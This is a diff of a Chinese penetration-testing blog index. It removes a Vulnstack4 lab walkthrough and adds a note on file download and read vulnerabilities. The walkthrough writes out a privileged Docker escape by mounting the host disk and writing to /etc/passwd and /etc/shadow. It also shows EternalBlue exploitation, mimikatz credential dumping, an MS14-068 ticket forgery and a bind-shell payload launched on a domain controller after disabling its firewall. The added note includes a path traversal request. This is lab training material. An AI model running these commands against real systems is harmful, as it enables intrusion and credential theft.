-<p>然而尝试过后并不可行，原因是<strong>eval()并不是函数，它是一个语言构造器，不能被可变函数调用</strong>，所以打咩</p>
-<p>而且我还查到，<strong>assert() is a language construct in PHP 7</strong>，大写的一个G</p>
-<p>在本地测试总结下来就是：<strong>eval()不能用可变函数调用，php7.1之后assert()也不能用可变函数调用，并且assert()7.1之后也不能用作一句话，但实际情况还是测一下万一能用</strong></p>
-<p>但这里还有一个奇怪的点，记录一下</p>
-<p>我在本地测试的时候，用的是PHP7.3.9，虽然直接使用assert()，<strong>会报不能用可变字符串的错但是能连上蚁剑</strong>（蚁剑编码器勾选base64）</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125228664.png" alt="image-20220717125228664"></p>
-<p>而且在浏览器上测都不用base64就能执行</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125331910.png" alt="image-20220717125331910"></p>
-<p>可以看到有报错，但是能执行太怪了，我已经晕了</p>
-<h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><a href="https://www.freebuf.com/articles/web/278808.html">https://www.freebuf.com/articles/web/278808.html</a></p>
-<p>这里有个疑问，上面链接的文章中说<strong>php会将前面的db_sql.php?当成目录</strong>，但我在本地测并没有成功，不知原因</p>
-<h3 id="逃逸docker容器–privileged特权模式"><a href="#逃逸docker容器–privileged特权模式" class="headerlink" title="逃逸docker容器–privileged特权模式"></a>逃逸docker容器–privileged特权模式</h3><blockquote>
-<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将<strong>被允许访问主机上的所有设备</strong>，并可以执行mount命令进行挂载。</p>
-<p>当控制使用特权模式启动的容器时，docker管理员可通过<strong>mount命令将外部宿主机磁盘设备挂载进容器内部</strong>，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
-</blockquote>
-<p>这里查看docker启动的配置文件.yml发现只有tomcat这个容器是特权模式启动起来的</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165347989.png" alt="image-20220717165347989"></p>
-<p>其实通过看<code>ls /dev</code>也可以看出端倪，明显特权模式的设备更多</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165258051.png" alt="image-20220717165258051"></p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165143713.png" alt="image-20220717165143713"></p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717164420846.png" alt="image-20220717164420846"></p>
-<p>所以接下来的操作都是基于tomcat这个docker容器完成</p>
-<h4 id="姿势1：添加用户–来自白日梦组长"><a href="#姿势1：添加用户–来自白日梦组长" class="headerlink" title="姿势1：添加用户–来自白日梦组长"></a>姿势1：添加用户–来自白日梦组长</h4><blockquote>
-<p>通过修改/etc/passwd和/etc/shadow文件</p>
-<p>/dev/sd[a-z]：SCSI设备</p>
-</blockquote>
-<p>在根目录下创建一个目录名为hacker的文件夹，并将/dev/sda1挂载到该目录下，这是/hacker相当于就是物理主机的根目录了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717172258614.png" alt="image-20220717172258614"></p>
-<p>（插一句，这里提权不能直接添加root用户，因为root用户没有远程登录权限，我们现在只是有对文件操作的权限，并不能重启ssh服务来修改配置，所以下面添加的是一个普通用户）</p>
-<blockquote>
-<p>PermitRootLogin 配置项都有哪些配置参数？</p>
-<ul>
-<li>yes</li>
-<li>no</li>
-<li>without-password：root可以登录，但是不允许通过密码ssh登陆</li>
-<li>forced-commands-only：可以登录，但是登陆后不能进入交互，而是执行指定的命令后自动退出</li>
-</ul>
-</blockquote>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223312448.png" alt="image-20220717223312448"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先在kali里创一个普通用户</span></span><br><span class="line">useradd -m hack</span><br><span class="line">passwd hack</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用上面创建的用户信息修改目标/etc/passwd和/etc/shadow</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:x:1002:1002::/home/hack:/bin/sh&#x27;</span> &gt;&gt; /hacker/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$6$sZJ3nupD0kfMhAN5$rQ36pINAUIDIE7HCvbWOBLhdtDL5M7D5dw2Af5saRzTbI0PHFBlc2DyDjQPH1880gpDr4VrHh526hxigF5Ksk.:19190:0:99999:7:::&#x27;</span> &gt;&gt; /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在kali中ssh登录该用户</span></span><br><span class="line">ssh hack@192.168.184.139</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717180458569.png" alt="image-20220717180458569"></p>
-<p>这里还只是普通用户权限</p>
-<p>直接使用<code>sudo su root</code>进行提权会提示用户不在sudoers file中</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181515687.png" alt="image-20220717181515687"></p>
-<p>我们可以回到tomcat的shell里去手动添加</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181841154.png" alt="image-20220717181841154"></p>
-<p>再次执行<code>sudo su root</code>，提权成功</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181946938.png" alt="image-20220717181946938"></p>
-<p>这里觉得白日梦组长的姿势太帅了，学到了很多</p>
-<h4 id="姿势2：ssh密钥利用"><a href="#姿势2：ssh密钥利用" class="headerlink" title="姿势2：ssh密钥利用"></a>姿势2：ssh密钥利用</h4><blockquote>
-<p>前提：目标已经开启ssh密钥登陆功能，因为虽然我们能修改/etc/ssh/sshd_config</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RSAAuthentication</span> <span class="literal">yes</span></span><br><span class="line">PubkeyAuthentication <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
-
-<p>但是没有权限重启ssh服务</p>
-</blockquote>
-<p>挂载就不赘述了，同姿势1</p>
-<p>这里查看配置文件/etc/ssh/sshd_config，开启密钥登陆，故可行</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223100634.png" alt="image-20220717223100634"></p>
-<ol>
-<li><p>制作密钥对</p>
-<p>首先在kali上制作密钥对。首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717224512053.png" alt="image-20220717224512053"></p>
-</li>
-<li><p>在目标上安装公钥</p>
-<p>首先利用冰蝎将生成的公钥<code>id_rsa.pub</code>上传到目标<code>/hacker/home/ubuntu/.ssh/</code>目录，然后执行如下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p>这里还需要对一些权限进行修改</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 authorized_keys</span><br><span class="line">chmod 700 /hacker/home/ubuntu/.ssh</span><br></pre></td></tr></table></figure></li>
-<li><p>ssh密钥登录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa ubuntu@192.168.184.139</span><br></pre></td></tr></table></figure>
-
-<p>但是不知道为什么我试了好多次都没有成功，我甚至重新把这个ubuntu装了一遍还是不行，离谱</p>
-</li>
-</ol>
-<h3 id="攻入内网"><a href="#攻入内网" class="headerlink" title="攻入内网"></a>攻入内网</h3><p>前面已经拿下了Ubuntu这台服务器，查看网卡信息</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718113156078.png" alt="image-20220718113156078"></p>
-<p>看到有192.168.183.0/24内网网段</p>
-<p>利用<code>scp</code>将fscan传到Ubuntu上，利用fscan对内网进行漏洞探针</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">scp /fscan hack@192.168.184.139:/tmp</span><br><span class="line"><span class="comment">## 密码：123456777</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">chmod +x /tmp/fscan</span><br><span class="line">/tmp/fscan -h 192.168.183.0/24</span><br></pre></td></tr></table></figure>
-
-<p>fscan扫描结果如下</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115340547.png" alt="image-20220718115340547"></p>
-<p>192.168.183.132这台windows7存在永恒之蓝，直接利用msf开打</p>
-<p>因为是内网主机，所以这里需要我们正向去打</p>
-<p>首先利用ssh在kali本地的1080端口开启一个动态代理</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 1080 hack@192.168.184.139</span><br><span class="line"><span class="comment"># 密码：123456777</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115523769.png" alt="image-20220718115523769"></p>
-<p>之后利用msf去打，这里有两点要注意，一是要设置正向payload，二是要设置一个全局变量proxies</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp  # 正向连接的payload</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">132</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span>  # setg是设置全局变量的意思，这里设置代理才能访问到内网主机</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>获取到win7的shell，并且获取到system权限</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120048139.png" alt="image-20220718120048139"></p>
-<p>这里拿到shell去翻桌面看看时，发现有MS14-068.exe，靶场作者已经明示让我用这个洞去打与空了</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120749389.png" alt="image-20220718120749389"></p>
-<p>这里其实还可以通过<code>systeminfo</code>命令看打了哪些补丁来看存在什么漏洞</p>
-<p>好，明确了目标，用MS14-068来打域控，这时还差域用户名，域名，域用户sid，域控地址以及密码</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718121846579.png" alt="image-20220718121846579"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 这里域用户名，域名，域控地址都可以很快得到</span><br><span class="line">域用户名：douser</span><br><span class="line">域名：demo.com</span><br><span class="line">域控地址：<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
-
-<p>要获得sid需要切换到域用户权限，获得密码要借助mimikatz(靶机上本来就有一个)</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 没切换用户前，当前为system，看不到域用户的sid</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123117476.png" alt="image-20220718123117476"></p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123126631.png" alt="image-20220718123126631"></p>
-<p>这里就需要窃取域用户的令牌，降权到域用户身份，才能读到域用户sid</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># msf的meterpreter</span><br><span class="line">ps</span><br><span class="line">steal_token <span class="number">2552</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123340564.png" alt="image-20220718123340564"></p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123502861.png" alt="image-20220718123502861"></p>
-<p>得到demo\douser用户的sid<code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p>
-<p>然后我们在meterpreter处使用命令<code>rev2self</code>移除令牌，回到system权限，用mimikatz读取密码</p>
-<p>此处有个坑，我用ms17_010获得的system权限在运行mimikatz的时候回报错：</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124306186.png" alt="image-20220718124306186"></p>
-<p>查找网上wp说模拟一个目标机上的system的令牌就可以，但我也没有成功</p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">load</span> Incognito</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>最后看白日梦组长的视频，使用msf中meterpreter的kiwi模块</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">load kiwi</span></span><br><span class="line"><span class="attribute">creds_all</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124936180.png" alt="image-20220718124936180"></p>
-<p>得到douser的密码<code>Dotest123</code></p>
-<p>接下来就利用MS14-068来生成票据</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ms14-<span class="number">068</span> -u douser@demo.com -p Dotest123 -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">979886063</span>-<span class="number">1111900045</span>-<span class="number">1414766810</span>-<span class="number">1107</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125446698.png" alt="image-20220718125446698"></p>
-<p>然后利用mimikatz的kerberos::ptc进行票据传递</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line"><span class="function">kerberos::<span class="title">ptc</span> <span class="title">TGT_douser</span>@<span class="title">demo.com.ccache</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125636062.png" alt="image-20220718125636062"></p>
-<p>然后就拿下域控了</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 注意这里必须用主机名称才能访问，用ip不得行</span><br><span class="line"><span class="built_in">dir</span> \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125946996.png" alt="image-20220718125946996"></p>
-<p>进一步攻击域控获取域控密码等</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># win7</span><br><span class="line">## 用<span class="built_in">net</span> use和域控建立连接</span><br><span class="line"><span class="built_in">net</span> use \\WIN-ENS2VR5TR3N</span><br><span class="line"></span><br><span class="line"># kali</span><br><span class="line">## kali创建正向连接木马(默认开启<span class="number">4444</span>监听)</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">## 利用msf的meterpreter的upload将bind.exe上传到win7</span><br><span class="line">upload /bind.exe c:\\users\\douser\\desktop\\bind.exe</span><br><span class="line"></span><br><span class="line">## msf开启监听(另外启一个)</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span></span><br><span class="line"><span class="built_in">set</span> AutoRunScript post/windows/manage/migrate  # 自动迁移进程</span><br><span class="line"></span><br><span class="line">#win7</span><br><span class="line">## 然后通过win7将bind.exe传到域控上(WIN-ENS2VR5TR3N)</span><br><span class="line"><span class="built_in">copy</span> c:\Users\douser\Desktop\bind.exe \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">## 通过远程在域控上面设置好计划任务(但是提示Access is denied)</span><br><span class="line">schtasks /create /tn &quot;test&quot; /tr C:\windows\system32\bind.exe /sc MINUTE /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">## 我们用sc服务来远程执行，先关闭防火墙</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="built_in">set</span> allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> unablefirewall</span><br><span class="line"></span><br><span class="line">## 创建服务执行msf马</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> bindshell</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144354407.png" alt="image-20220718144354407"></p>
-<p>运行完木马后msf收到shell</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144727846.png" alt="image-20220718144727846"></p>
-<p>接下来抓取密码</p>
-<p>通过meterpreter的upload将mimikatz传上去</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">upload /mimikatz.exe c:\mimikatz.exe</span><br><span class="line"><span class="built_in">cd</span> c:\</span><br><span class="line">mimikatz</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150112535.png" alt="image-20220718150112535"></p>
-<p>得到明文密码：<code>Test2022</code></p>
-<p>有了明文密码，接下来登录远程桌面</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用meterpreter把远程桌面开启</span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150403954.png" alt="image-20220718150403954"></p>
-<p>然后上代理远程登陆</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150657246.png" alt="image-20220718150657246"></p>
-<p>到此结束</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[<a href="https://www.bilibili.com/video/BV19r4y1y7Nk?spm_id_from=333.337.search-card.all.click&vd_source=fb474708f246c21e5933eeb76372688d">网络安全/域渗透]内网安全入门靶场 vulnstack4攻略</a></p>
-<p><a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二）</a></p>
-<p><a href="https://xz.aliyun.com/t/6511">一句话木马踩坑记</a></p>
-<p><a href="http://c.biancheng.net/view/839.html">Linux /etc/passwd内容解释</a></p>
-<p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow（影子文件）内容解析</a></p>
-<p><a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">设置 SSH 通过密钥登录 </a></p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网安全，vulnstack</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE</title>
     <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<blockquote>
@@ -1063,6 +1063,55 @@
       </tags>
   </entry>
   <entry>
+    <title>文件下载读取</title>
+    <url>/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/</url>
+    <content><![CDATA[<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>显示源代码，则为文件读取漏洞</p>
+<p>提示文件下载，则为文件下载漏洞</p>
+<p>文件被解析成脚本语言，则为文件包含漏洞</p>
+<span id="more"></span>
+
+<h2 id="漏洞检测点"><a href="#漏洞检测点" class="headerlink" title="漏洞检测点"></a>漏洞检测点</h2><h3 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h3><p>read.xxx?filename=</p>
+<p>down.xxx?filename=</p>
+<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><p>&amp;readpath=    &amp;filepath=    &amp;path=    &amp;inputfile=    &amp;url=    &amp;data=    &amp;readfile=    &amp;menu=    META-INF=    WEB-INF</p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>参数值有的会用加密算法进行<strong>加密</strong>，所以在下载想要的文件，需要对该文件路径进行加密</p>
+<h3 id="目录符号"><a href="#目录符号" class="headerlink" title="目录符号"></a>目录符号</h3><p><code>../</code>    <code>..\</code>    <code>./</code>    <code>.\</code>等</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h2 id="常见文件"><a href="#常见文件" class="headerlink" title="常见文件"></a>常见文件</h2><p>后台首页日志等可见文件</p>
+<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>数据库配置文件下载或读取及后续</p>
+<p>接口密匙信息文件下载或读取及后续</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="pikachu任意文件下载"><a href="#pikachu任意文件下载" class="headerlink" title="pikachu任意文件下载"></a>pikachu任意文件下载</h3><p>访问靶场后查看右键复制图片地址进行查看</p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
+<p>得到图片地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/download/ai.png</code></p>
+<p>右键复制查看下载地址</p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
+<p>得到下载地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</code></p>
+<p>现在我们通过漏洞下载<code>execdownload.php</code>文件，查看其源代码，但由于<code>execdownload.php</code>文件在<code>ai.png</code>的上一级目录，所以我们构造的攻击语句为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>
+
+<p>得到源码，得到下载漏洞目录是<code>download/</code></p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp3.png" alt="pikachu任意文件下载-wp3"></p>
+<p>接下来我们通过该漏洞去下载<strong>敏感文件</strong>或<strong>配置文件</strong></p>
+<p>但一般这些文件需要知道绝对路径，我们可以使用扫描器去扫，用大一点的字典去跑</p>
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">[RoarCTF 2019]Easy Java</a></h3><p>Java开发的项目文件下载一般用POST传参</p>
+<p>此题读取WEB配置文件WEB-INF/web.xml</p>
+<p><a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p>
+<p><a href="https://blog.csdn.net/silencediors/article/details/102579567">https://blog.csdn.net/silencediors/article/details/102579567</a></p>
+<h3 id="“百度杯”CTF比赛-2017-二月场-Zone"><a href="#“百度杯”CTF比赛-2017-二月场-Zone" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-Zone"></a><a href="https://www.ichunqiu.com/battalion?t=1&r=57475">“百度杯”CTF比赛 2017 二月场-Zone</a></h3><p><a href="https://www.ichunqiu.com/writeup/detail/4941">https://www.ichunqiu.com/writeup/detail/4941</a></p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="小米路由器远程任意文件读取漏洞"><a href="#小米路由器远程任意文件读取漏洞" class="headerlink" title="小米路由器远程任意文件读取漏洞"></a><a href="https://www.seebug.org/vuldb/ssvid-98122">小米路由器远程任意文件读取漏洞</a></h3><h2 id="Java文件下载"><a href="#Java文件下载" class="headerlink" title="Java文件下载"></a>Java文件下载</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>mvc框架：model view controller</p>
+<p><a href="http://www.baidu.com/link?url=UA_cyTHHSeD2kK_DpzJiSGieQvPpY5mbLBFq_VFEUXTcAOW-Epp3yUjbjrAAWdyD_DrfySzJdTu7haN3brxyUa&wd=&eqid=a8af765e000244620000000661330346"><em>MVC 模式</em> | 菜鸟教程</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>文件操作</tag>
+        <tag>文件下载</tag>
+        <tag>文件读取</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>逻辑越权</title>
     <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
